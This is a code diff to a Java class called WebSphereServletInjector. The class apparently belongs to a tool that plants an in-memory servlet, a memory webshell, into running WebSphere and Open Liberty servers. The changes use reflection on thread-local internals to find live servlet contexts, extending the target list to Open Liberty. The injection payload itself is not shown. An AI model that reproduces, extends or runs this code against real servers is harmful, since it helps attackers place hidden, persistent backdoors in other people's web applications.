@@ -6,7 +6,9 @@ import java.io.IOException;
 import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.*;
+import java.util.HashSet;
+import java.util.Properties;
+import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -39,7 +41,7 @@ public class WebSphereServletInjector {
         } catch (Throwable throwable) {
             msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts == null) {
+        if (contexts == null || contexts.isEmpty()) {
             msg += "context not found";
         } else {
             for (Object context : contexts) {
@@ -76,11 +78,32 @@ public class WebSphereServletInjector {
 
     public Set<Object> getContext() throws Exception {
         Set<Object> contexts = new HashSet<Object>();
-        Object[] wsThreadLocals = (Object[]) getFieldValue(Thread.currentThread(), "wsThreadLocals");
-        for (Object wsThreadLocal : wsThreadLocals) {
+        Object[] threadLocals = null;
+        boolean raw = false;
+        try {
+            // WebSphere Liberty
+            threadLocals = (Object[]) getFieldValue(Thread.currentThread(), "wsThreadLocals");
+        } catch (NoSuchFieldException ignored) {
+        }
+        if (threadLocals == null) {
+            // Open Liberty
+            threadLocals = (Object[]) getFieldValue(getFieldValue(Thread.currentThread(), "threadLocals"), "table");
+            raw = true;
+        }
+        for (Object threadLocal : threadLocals) {
+            if (threadLocal == null) {
+                continue;
+            }
+            Object value = threadLocal;
+            if (raw) {
+                value = getFieldValue(threadLocal, "value");
+            }
+            if (value == null) {
+                continue;
+            }
             // for websphere 7.x
-            if (wsThreadLocal != null && wsThreadLocal.getClass().getName().endsWith("FastStack")) {
-                Object[] stackList = (Object[]) getFieldValue(wsThreadLocal, "stack");
+            if (value.getClass().getName().endsWith("FastStack")) {
+                Object[] stackList = (Object[]) getFieldValue(value, "stack");
                 for (Object stack : stackList) {
                     try {
                         Object config = getFieldValue(stack, "config");
@@ -88,8 +111,9 @@ public class WebSphereServletInjector {
                     } catch (Exception ignored) {
                     }
                 }
-            } else if (wsThreadLocal != null && wsThreadLocal.getClass().getName().endsWith("WebContainerRequestState")) {;
-                contexts.add(getFieldValue(getFieldValue(getFieldValue(getFieldValue(getFieldValue(wsThreadLocal, "currentThreadsIExtendedRequest"), "_dispatchContext"), "_webapp"), "facade"), "context"));
+            } else if (value.getClass().getName().endsWith("WebContainerRequestState")) {
+                Object webApp = invokeMethod(getFieldValue(getFieldValue(value, "currentThreadsIExtendedRequest"), "_dispatchContext"), "getWebApp", null, null);
+                contexts.add(getFieldValue(getFieldValue(webApp, "facade"), "context"));
             }
         }
         return contexts;
